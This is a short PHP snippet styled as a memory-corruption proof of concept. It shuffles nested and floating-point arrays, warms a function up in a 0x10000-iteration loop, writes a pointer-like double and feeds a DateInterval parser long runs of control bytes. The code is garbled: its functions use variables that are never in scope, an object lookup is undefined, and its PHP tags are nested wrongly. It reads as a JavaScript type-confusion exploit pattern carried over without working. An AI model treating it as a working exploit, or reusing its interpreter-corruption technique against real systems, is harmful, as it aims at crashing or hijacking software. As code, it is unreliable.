<?php
<code>
<?php

$array = array(array(array()), array(1.1));

function transition() {
  foreach ($array as &$arr) {
    $arr[0] = array();
  }
}

$double_arr2 = array(1.1, 2.2);

$flag = 0;
function swap() {
  if ($flag == 1) {
    $array[1] = $double_arr2;
  }
}

$expected = 6.176516726456e-312;
function f() {
  swap();
  $double_arr2[0] = 1;
  transition();
  $double_arr2[1] = $expected;
}

$vars["DateInterval"]->createFromDateString(str_repeat(chr(0x1A), 65). "a". str_repeat(chr(0x1B), 65). "b". str_repeat(chr(0x1C), 65). "c". str_repeat(chr(0x1D), 65). "d". str_repeat(chr(0x1E), 65). "e". str_repeat(chr(0x1F), 65));

for ($i = 0; $i < 0x10000; $i++) {
  f();
}
$flag = 1;
f();

var_dump($double_arr2[1] == $expected);

?>
</code>

?>